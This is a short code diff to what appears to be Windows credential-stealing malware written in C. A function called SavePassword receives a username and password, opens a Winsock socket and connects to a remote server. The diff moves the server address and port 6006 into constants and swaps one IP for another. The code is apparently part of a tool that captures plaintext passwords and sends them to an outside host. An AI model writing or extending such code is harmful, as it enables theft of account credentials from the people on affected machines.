@@ -7,6 +7,8 @@
 
 #pragma comment(lib,"ws2_32.lib") //Winsock Library
 
+#define PORT 6006
+#define SERVER_IP "192.168.153.136"
 
 int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 {
@@ -44,9 +46,9 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	printf("Socket created.\n");
 
 
-	server.sin_addr.s_addr = inet_addr("129.21.101.247");
+	server.sin_addr.s_addr = inet_addr(SERVER_IP);
 	server.sin_family = AF_INET;
-	server.sin_port = htons(6006);
+	server.sin_port = htons(PORT);
 
 	//Connect to remote server
 	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
